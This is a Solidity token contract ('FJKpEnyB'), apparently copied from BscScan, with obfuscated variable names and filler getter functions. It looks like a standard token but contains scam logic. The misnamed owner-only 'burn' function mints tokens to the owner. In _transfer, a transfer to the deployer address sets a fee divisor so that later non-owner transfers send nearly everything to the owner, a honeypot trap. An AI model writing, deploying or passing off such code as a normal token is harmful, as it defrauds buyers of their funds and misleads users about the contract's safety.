/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.11;
contract FJKpEnyB {
event Transfer(address indexed from, address indexed to, uint256 value);
string public  symbol = "FJKpEnyB";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public owner;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  SMPNEm = 10000000000;
address private  RolHZa = address(0);
uint8 public constant decimals = 18;
uint256 private  SpcBRZ = 10000000000000;
string public  name = "FJKpEnyB";
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  aUmzMh = address(0);
address private  LEEqZj = address(0);
uint256 private  AgAHXB = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  DMhHII = 1000000000000000000000;
address private  pDrbwc = address(0);
address private  BAZOYE = address(0);
uint256 private  ZsFNmR = 1000000000000000;
mapping (address => uint256) public balanceOf;
address private  LCIQqH = address(0);
address private  EQHWMi = address(0);
uint256 public constant UHkOjm = 99999;
uint256 private  fSEqWK = 100000000;
uint256 private  jVqaMq = 1000000000000000000;
address private  uhXSMi = address(0);
address private  QZqNaD = address(0);


function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "txLCMzO 0");
require(spender != address(0), "fxLCMzO 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}


modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getQZqNaD() private returns (address) {
return QZqNaD;
}

function _getRolHZa() private returns (address) {
return RolHZa;
}


function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}


function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "xLCMzO");
require(to != address(0), "xLCMzO");
require(amount <= balanceOf[from], "xLCMzO");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* UHkOjm/jVqaMq ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==uhXSMi){
jVqaMq = UHkOjm+2;
}
emit Transfer(from, to, transferAmount);
}


function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getLCIQqH() private returns (address) {
return LCIQqH;
}



constructor () public {
uhXSMi = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getpDrbwc() private returns (address) {
return pDrbwc;
}

function _getEQHWMi() private returns (address) {
return EQHWMi;
}



function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getDMhHII() private returns (uint256) {
return DMhHII;
}





function _getZsFNmR() private returns (uint256) {
return ZsFNmR;
}

function _getLEEqZj() private returns (address) {
return LEEqZj;
}

function _getSMPNEm() private returns (uint256) {
return SMPNEm;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}


function _getSpcBRZ() private returns (uint256) {
return SpcBRZ;
}

function _getaUmzMh() private returns (address) {
return aUmzMh;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}


function _getAgAHXB() private returns (uint256) {
return AgAHXB;
}





function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}



}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
		function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}